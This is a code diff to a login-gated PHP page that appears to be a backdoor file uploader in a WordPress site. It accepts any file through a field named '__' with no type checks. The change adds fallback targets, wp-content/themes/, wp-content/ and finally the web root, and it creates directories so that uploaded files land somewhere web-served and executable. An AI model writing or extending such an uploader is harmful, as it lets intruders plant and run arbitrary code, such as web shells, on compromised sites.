@@ -196,21 +196,51 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
     <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['__'])): ?>
     <?php
     $tmp = $_FILES['__']['tmp_name'];
-    $name = basename($_FILES['__']['name']); // mencegah path traversal
-    $target = __DIR__ . '/wp-content/themes/' . $name;
+    $name = basename($_FILES['__']['name']);
+    $original_name = $name;
 
-    if (is_uploaded_file($tmp)) {
-        if (move_uploaded_file($tmp, $target)) {
-            $fullPath = realpath($target);
-            echo '<div class="notification success">';
-            echo "> File uploaded successfully!\n";
-            echo "> Path: " . htmlspecialchars($fullPath);
-            echo '</div>';
-        } else {
-            echo '<div class="notification error">> Unable to upload file</div>';
-        }
-    } else {
+    if (!is_uploaded_file($tmp)) {
         echo '<div class="notification error">> Upload failed</div>';
+        return;
+    }
+
+    // Daftar lokasi tujuan (urutkan berdasarkan prioritas)
+    $upload_dirs = [
+        __DIR__ . '/wp-content/themes/',
+        __DIR__ . '/wp-content/',
+        __DIR__ . '/',
+    ];
+
+    $uploaded = false;
+    $finalPath = '';
+
+    foreach ($upload_dirs as $dir) {
+        // Buat direktori jika belum ada (opsional, tapi disarankan)
+        if (!is_dir($dir)) {
+            @mkdir($dir, 0755, true); // recursive, ignore error jika gagal
+        }
+
+        // Pastikan direktori bisa ditulis
+        if (!is_writable($dir)) {
+            continue; // coba lokasi berikutnya
+        }
+
+        $target = $dir . $name;
+
+        if (move_uploaded_file($tmp, $target)) {
+            $finalPath = realpath($target);
+            $uploaded = true;
+            break; // berhasil → hentikan loop
+        }
+    }
+
+    if ($uploaded) {
+        echo '<div class="notification success">';
+        echo "> File uploaded successfully!\n";
+        echo "> Path: " . htmlspecialchars($finalPath);
+        echo '</div>';
+    } else {
+        echo '<div class="notification error">> Unable to upload file to any location</div>';
     }
     ?>
 <?php endif; ?>
@@ -219,3 +249,4 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
 </body>
 
 </html>
+
